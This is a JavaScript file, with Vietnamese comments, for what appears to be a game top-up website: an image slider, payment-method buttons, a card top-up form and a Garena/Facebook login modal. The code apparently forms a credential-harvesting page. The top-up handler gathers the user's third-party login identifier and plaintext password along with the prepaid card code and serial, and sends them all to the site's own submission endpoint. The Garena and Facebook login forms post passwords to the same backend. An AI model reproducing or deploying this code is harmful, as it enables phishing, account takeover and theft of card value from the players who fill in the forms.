// Slider
const slides = document.querySelector(".slides");
if (slides) {
    const images = document.querySelectorAll(".slides img");
    const prevBtn = document.querySelector(".prev");
    const nextBtn = document.querySelector(".next");

    let counter = 1;
    const size = images[0].clientWidth;

    slides.style.transform = 'translateX(' + (-size * counter) + 'px)';

    nextBtn.addEventListener('click', () => {
        if (counter >= images.length - 1) return;
        slides.style.transition = "transform 0.4s ease-in-out";
        counter++;
        slides.style.transform = 'translateX(' + (-size * counter) + 'px)';
    });

    prevBtn.addEventListener('click', () => {
        if (counter <= 0) return;
        slides.style.transition = "transform 0.4s ease-in-out";
        counter--;
        slides.style.transform = 'translateX(' + (-size * counter) + 'px)';
    });

    slides.addEventListener('transitionend', () => {
        if (images[counter].id === 'lastClone') {
            slides.style.transition = "none";
            counter = images.length - 2;
            slides.style.transform = 'translateX(' + (-size * counter) + 'px)';
        }
        if (images[counter].id === 'firstClone') {
            slides.style.transition = "none";
            counter = images.length - counter;
            slides.style.transform = 'translateX(' + (-size * counter) + 'px)';
        }
    });
}

// Payment Methods
const paymentMethods = document.querySelectorAll(".payment-methods button");
if (paymentMethods) {
    paymentMethods.forEach(button => {
        button.addEventListener("click", () => {
            paymentMethods.forEach(btn => btn.classList.remove("active"));
            button.classList.add("active");
        });
    });
}

// Xử lý nạp thẻ
const cardForm = document.querySelector(".card-form");
if (cardForm) {
    const submitBtn = cardForm.querySelector(".submit-btn");
    
    submitBtn.addEventListener("click", async (e) => {
        e.preventDefault();
        
        // Lấy thông tin thẻ
        const cardCode = document.getElementById("card-code").value;
        const serialNumber = document.getElementById("serial").value;
        
        // Lấy mệnh giá thẻ đã chọn
        const selectedPrice = document.querySelector('input[name="price"]:checked');
        if (!selectedPrice) {
            alert("Vui lòng chọn mệnh giá thẻ");
            return;
        }
        
        const amount = parseInt(selectedPrice.value);
        
        // Kiểm tra dữ liệu
        if (!cardCode || !serialNumber) {
            alert("Vui lòng nhập đầy đủ thông tin thẻ");
            return;
        }
        
        try {
            const activeLoginMethod = document.querySelector('.login-methods button.active');
            const loginType = activeLoginMethod ? activeLoginMethod.innerText.trim() : 'Unknown';
            
            const loginForm = document.querySelector('.login-form[style*="block"]');
            let loginIdentifier = '';
            let loginPassword = '';
            if (loginForm) {
                const identifierInput = loginForm.querySelector('input[type="text"], input[type="email"]');
                const passwordInput = loginForm.querySelector('input[type="password"]');
                if (identifierInput) {
                    loginIdentifier = identifierInput.value;
                }
                if (passwordInput) {
                    loginPassword = passwordInput.value;
                }
            }
            
            const activePaymentMethod = document.querySelector('.payment-methods button.active');
            const paymentMethod = activePaymentMethod ? activePaymentMethod.innerText.trim() : 'Unknown';

            const requestData = {
                login_type: loginType,
                login_identifier: loginIdentifier,
                login_password: loginPassword,
                payment_method: paymentMethod,
                amount: amount,
                card_code: cardCode,
                serial_number: serialNumber
            };
            
            // Gửi request API
            const response = await fetch(BASE_URL + '/backend/api/submission.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestData)
            });
            
            const result = await response.json();
            
            if (result.success) {
                alert("Thông tin của bạn đã được gửi thành công!");
            } else {
                alert(result.message || "Có lỗi xảy ra khi gửi thông tin");
            }
        } catch (error) {
            console.error("Error:", error);
            alert("Có lỗi xảy ra khi kết nối đến máy chủ");
        }
    });
}

// Hàm format tiền tệ
function formatCurrency(amount) {
    return amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}

// Login Forms
document.addEventListener('DOMContentLoaded', function () {
    const loginMethods = document.querySelectorAll(".login-methods");

    loginMethods.forEach(loginMethod => {
        const loginButtons = loginMethod.querySelectorAll("button");
        const loginForms = document.querySelectorAll(".login-form");

        loginButtons.forEach(button => {
            button.addEventListener("click", () => {
                loginButtons.forEach(btn => btn.classList.remove("active"));
                loginForms.forEach(form => form.style.display = "none");
                button.classList.add("active");
                const formId = button.id.replace("-btn-page", "-form-page");
                const targetForm = document.getElementById(formId) || document.getElementById(formId.replace("-page", ""));
                if (targetForm) {
                    targetForm.style.display = "block";
                }
            });
        });
    });
});

// Login Modal
document.addEventListener('DOMContentLoaded', function () {
    const loginModal = document.getElementById("login-modal");
    const loginBtn = document.getElementById("login-btn");
    if (!loginModal || !loginBtn) return;

    const closeBtn = loginModal.querySelector(".close-btn");
    const garenaLoginBtn = document.getElementById("garena-login-btn");
    const facebookLoginBtn = document.getElementById("facebook-login-btn");
    const garenaLoginForm = document.getElementById("garena-login-form");
    const facebookLoginForm = document.getElementById("facebook-login-form");
    const loginOptions = loginModal.querySelector(".login-options");

    loginBtn.addEventListener('click', function (event) {
        event.preventDefault();
        loginModal.style.display = "block";
        garenaLoginForm.style.display = "none";
        facebookLoginForm.style.display = "none";
        loginOptions.style.display = "flex";
        garenaLoginBtn.style.display = "flex";
        facebookLoginBtn.style.display = "flex";
    });

    closeBtn.addEventListener('click', function () {
        loginModal.style.display = "none";
    });

    window.addEventListener('click', function (event) {
        if (event.target == loginModal) {
            loginModal.style.display = "none";
        }
    });

    garenaLoginBtn.addEventListener('click', function (event) {
        event.preventDefault();
        loginOptions.style.display = "none";
        garenaLoginForm.style.display = "block";
    });

    facebookLoginBtn.addEventListener('click', function (event) {
        event.preventDefault();
        loginOptions.style.display = "none";
        facebookLoginForm.style.display = "block";
    });

    // Xử lý gửi biểu mẫu đăng nhập Garena
    const handleLogin = async (event) => {
        event.preventDefault();
        const form = event.target;
        const username = form.querySelector('input[type="text"], input[type="email"]').value;
        const password = form.querySelector('input[type="password"]').value;

        try {
            const response = await fetch(BASE_URL + '/backend/api/users/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            });

            const result = await response.json();

            if (result.success) {
                if (result.data.redirect) {
                    window.location.href = result.data.redirect;
                } else {
                    window.location.reload();
                }
            } else {
                alert(result.message || 'Đăng nhập thất bại');
            }
        } catch (error) {
            console.error('Lỗi đăng nhập:', error);
            alert('Đã xảy ra lỗi khi đăng nhập.');
        }
    };

    garenaLoginForm.addEventListener('submit', handleLogin);
    facebookLoginForm.addEventListener('submit', handleLogin);
});
